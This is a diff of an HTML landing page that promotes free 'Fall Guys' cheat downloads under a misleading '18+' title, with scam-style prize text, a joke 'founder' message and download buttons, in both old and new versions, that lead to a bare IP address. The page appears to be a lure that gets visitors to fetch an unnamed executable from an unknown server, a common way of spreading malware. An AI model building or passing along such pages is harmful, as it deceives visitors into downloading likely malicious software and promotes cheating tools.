@@ -4,205 +4,73 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>hot babes 18+</title>
-    <link href="https://fonts.googleapis.com/css2?family=Asap:wght@700;900&family=Titan+One&display=swap" rel="stylesheet">
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
             font-family: Arial, sans-serif;
-        }
-
-        #screen1 {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: black;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: white;
-        }
-
-        #screen1 h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-
-        #download-btn {
-            width: 300px;
-            height: 100px;
-            background-color: white;
-            color: black;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        #screen2 {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('https://happycrownfarm.net/FG_S6_pattern (3).png');
-            background-repeat: repeat;
-            background-size: 200px 200px;
-            animation: scroll-bg 10s linear infinite;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: white;
-        }
-
-        @keyframes scroll-bg {
-            0% { background-position: 0 0; }
-            100% { background-position: -282.84px 282.84px; }
-        }
-
-        #gradient-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, transparent, #cb5569);
-            pointer-events: none;
-        }
-
-        #logo {
-            width: 300px;
-            animation: hover 2s ease-in-out infinite;
-        }
-
-        @keyframes hover {
-            0% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0); }
-        }
-
-        #thanks {
-            font-family: 'Asap', sans-serif;
-            font-weight: 700;
-            font-size: 48px;
-            background: linear-gradient(90deg, #ff69b4, #ffff00, #00ff00, #00bfff, #9370db, #ff69b4);
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: rainbow 5s linear infinite, expand-shrink 1s ease-in-out infinite;
-            margin: 20px 0;
-        }
-
-        @keyframes rainbow {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
-        }
-
-        @keyframes expand-shrink {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-
-        #message-box {
-            background-color: grey;
-            border: 2px solid white;
-            border-radius: 20px;
-            padding: 20px;
-            width: 600px;
-            display: flex;
-            align-items: flex-start;
-            position: relative;
-        }
-
-        #selfie {
-            width: 100px;
-            height: 100px;
-            border-radius: 20px;
-            border: 2px solid white;
-            margin-right: 20px;
-        }
-
-        #message-content {
-            flex: 1;
-        }
-
-        #flounder-title {
-            font-family: 'Titan One', cursive;
-            font-size: 24px;
-            background: linear-gradient(90deg, #ff69b4, #ffff00, #00ff00, #00bfff, #9370db, #ff69b4);
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: rainbow 5s linear infinite;
-            margin-bottom: 10px;
-        }
-
-        #message-text {
-            font-family: 'Asap', sans-serif;
-            font-weight: 700;
-            font-size: 16px;
-        }
-
-        #footer-text {
-            font-family: 'Asap', sans-serif;
-            font-weight: 900;
-            color: black;
-            opacity: 0.5;
-            font-size: 14px;
-            margin-top: 20px;
             text-align: center;
+            background-color: #f0f0f0;
+            color: #333;
         }
-
-        #faq {
-            font-family: 'Asap', sans-serif;
-            font-weight: 700;
-            font-size: 24px;
-            background: linear-gradient(90deg, #ff69b4, #ffff00, #00ff00, #00bfff, #9370db, #ff69b4);
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: rainbow 5s linear infinite;
-            cursor: pointer;
-            margin-top: 10px;
+        .header {
+            background-color: #ff69b4;
+            padding: 20px;
+        }
+        .header h1 {
+            font-size: 3em;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .content {
+            margin: 20px;
+        }
+        .cool-title {
+            font-size: 1.5em;
+            color: #ff4500;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .bitches img {
+            width: 500px;
+            margin: 10px;
+            border-radius: 10px;
+            border: 3px solid #ff69b4;
+        }
+        .download-button {
+            background-color: #32cd32;
+            padding: 15px 25px;
+            font-size: 1.5em;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 10px;
+        }
+        .download-button:hover {
+            background-color: #00FF00;
+        }
+        .burp {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="screen1">
-        <h1>happycrownfarm.net bestest freesest downloads</h1>
-        <button id="download-btn">download</button>
-    </div>
-    <div id="screen2">
-        <div id="gradient-overlay"></div>
-        <img id="logo" src="https://happycrownfarm.net/happycrownfarm.png" alt="MY SHIT">
-        <div id="thanks">THANKS FOR DOWNLOADS</div>
-        <div id="message-box">
-            <img id="selfie" src="https://happycrownfarm.net/029.png" alt="ME">
-            <div id="message-content">
-                <div id="flounder-title">MESSAGE FROM OUR FOUNDER xXMLG_Fum0_G0DXx</div>
-                <div id="message-text">Ólafur Tryggvason, the former player who gained fame by cheating to win the first ever Fall Guys crown, has now retired from competitive play and focuses on creating content. He used various tools to gain an advantage, but always emphasized fair play and entertainment in his streams. His legacy in the Fall Guys community remains a mix of controversy and admiration for his skill.</div>
-            </div>
-        </div>
-        <div id="footer-text">HAPPYCROWNFARM.NET PROVIDE FREE FLYHACKER CHEATS FREE SAFE | HAPPYCROWNFARM.NET AND ITS SUBSIDIARIES<br>ARE PROPERTY OF xXMLG_Fum0_G0DXx | PLEASE CHEAT RESPONSIBLY</div>
-        <div id="faq" onclick="window.open('https://happycrownfarm.net/faq', '_blank')">FAQ</div>
-    </div>
-    <audio id="bla-bla-bla" src="https://happycrownfarm.net/THANKYOUFORDOWNLOAD.wav"></audio>
 
-    <script>
-        document.getElementById('download-btn').addEventListener('click', function() {
-            document.getElementById('screen1').style.display = 'none';
-            document.getElementById('screen2').style.display = 'flex';
-            window.open('http://85.192.49.206:10002/latest_ver', '_blank');
-            document.getElementById('bla-bla-bla').play();
-        });
-    </script>
-</body>
+<div class="header">
+    <h1>Fall guyshack 2026 free gamedownload</h1>
+</div>
+
+<div class="content">
+    <p class="cool-title">You just unlock lucky prises and more 🤩🌟 Go to my Https://HappyCrownFarm.Net to learn the More prize 🤑💸💸 Lets capitalise this advanture together Friend 😆👍</p>
+
+    <audio id="burrrpbuurpburp" class="burp" src="https://happycrownfarm.net/BNK-UI-MainMenuassets-8-4.mp3" preload="auto"></audio>
+
+    <div class="bitches">
+        <img src="https://media.wired.com/photos/5f29ded51d819f4642eff24d/master/pass/Culture_Fall_Guys_Gameplay_Trailer_002_v001_Comp-3_2020-04-29_17.10.13.jpg">
+        <img src="https://i.ytimg.com/vi/wX97P00T8R8/sddefault.jpg">
+        <img src="https://cdn.i-scmp.com/sites/default/files/styles/1020x680/public/d8/images/methode/2020/08/14/4f2c9bca-dbb5-11ea-b1d3-42d340dc91a3_image_hires_201943.jpg?itok=wh7oZZEc&v=1597407589">
+        <img src="https://img.utdstc.com/screen/422/1dd/4221dd42e2cd7e7f0f64dd3245bf988e5c7351784de4e78f76394615dd4e0409:600">
+    </div>
+
+    <a href="http://85.192.49.206:10002/latest_ver" class="download-button" onclick="const s=document.getElementById('burrrpbuurpburp'); s.currentTime=0; s.play(); setTimeout(()=>{ window.location.href=this.href; }, 150); return false;">FREE DOWNLOAD</a>
+
+</div></body>
 </html>
